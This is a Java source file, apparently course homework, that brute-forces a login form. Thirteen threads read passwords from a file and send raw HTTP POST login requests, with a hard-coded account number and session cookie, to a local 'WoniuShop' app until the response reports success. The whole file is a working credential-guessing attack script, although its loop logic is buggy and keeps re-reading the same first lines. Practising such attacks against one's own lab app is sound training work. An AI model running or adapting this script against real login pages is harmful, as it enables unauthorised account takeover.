package learn.woniuxy.tcphomework;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;


/**
 * 服务端
 * @author Administrator
 *
 */
public class BruteForce3 implements Runnable{
	
	
	private Thread t;

	public List<String> list;

	@Override
	public void run() {
		
		
		FileReader fr = null;
		BufferedReader br = null;
		int count = 0;
		String line = "";
		while(true) {
			this.list = new ArrayList<String>();
			try {
				fr = new FileReader("a.txt");
				br = new BufferedReader(fr);
				
				synchronized(br) {
					try {
						while((line = br.readLine()) != null) {
							if(count<50) {
								list.add(line);
								count++;
							}else {
								list.add(line);
								count = 0;
								break;
							}
						}
					} catch (IOException e) {
						e.printStackTrace();
					}
				}

			} catch (FileNotFoundException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} finally {
				try {
					if (br != null)
						br.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

				try {
					if (fr != null)
						fr.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

			
			try {
				Thread.sleep(1);
				display(this.list);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		
		
		
		
	}
	
	
	public void display(List<String> list) {
		Socket brower = null;
		OutputStream ops = null;
		InputStream ins = null;
		ByteArrayOutputStream baos = null;
		int len;

//		String password = "";

		// 隔行读取
		
		for(String password:list) {
			String dataStr = "oper=login&account=17760990684&pass=" + password;

			String str = "POST /WoniuShop1.0.0/useroper HTTP/1.1\r\n" + "Host: localhost:8080\r\n"
					+ "Content-Length:" + dataStr.length() + "\r\n"
					+ "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\r\n"
					+ "Cookie: JSESSIONID=5F8FCC77D22CBAA9EBA5567C244B43C0\r\n" + "\r\n" + dataStr; // data
			System.out.println(password + ":\r\n" + str);

			try {
				brower = new Socket("localhost", 8080);
				ops = brower.getOutputStream();
				ops.write(str.getBytes());// str转为byte数组

				ins = brower.getInputStream();

				byte[] con = new byte[1024];
				len = -1;
				baos = new ByteArrayOutputStream();
				while ((len = ins.read(con)) != -1) {
					baos.write(con, 0, len);
				}
				
				System.out.println(baos.toString());
				
				if(baos.toString().contains("登录成功")) {
					break;
				}

			} catch (UnknownHostException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} finally {
//						try {
//							if(baos!=null)
//								baos.close();
//						} catch (IOException e) {
//							// TODO Auto-generated catch block
//							e.printStackTrace();
//						}
				try {
					if (ins != null)
						ins.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				try {
					if (ops != null)
						ops.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				try {
					if (brower != null)
						brower.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}

			}
		}
	}
	
	
	private void start() {
		 if (t == null) {
	         t = new Thread (this);
	         t.start ();
	      }	
	}
	
    public static void main(String[] args) {
    	BruteForce3 b1 = new BruteForce3();
    	BruteForce3 b2 = new BruteForce3();
    	BruteForce3 b3 = new BruteForce3();
    	BruteForce3 b4 = new BruteForce3();
    	BruteForce3 b5 = new BruteForce3();
    	BruteForce3 b6 = new BruteForce3();
    	BruteForce3 b7 = new BruteForce3();
    	BruteForce3 b8 = new BruteForce3();
    	BruteForce3 b9 = new BruteForce3();
    	BruteForce3 b10 = new BruteForce3();
    	BruteForce3 b11 = new BruteForce3();
    	BruteForce3 b12 = new BruteForce3();
    	BruteForce3 b13 = new BruteForce3();
    	
    	b1.start();
    	b2.start();
    	b3.start();
    	b4.start();
    	b5.start();
    	b6.start();
    	b7.start();
    	b8.start();
    	b9.start();
    	b10.start();
    	b11.start();
    	b12.start();
    	b13.start();

	}

	
	
}
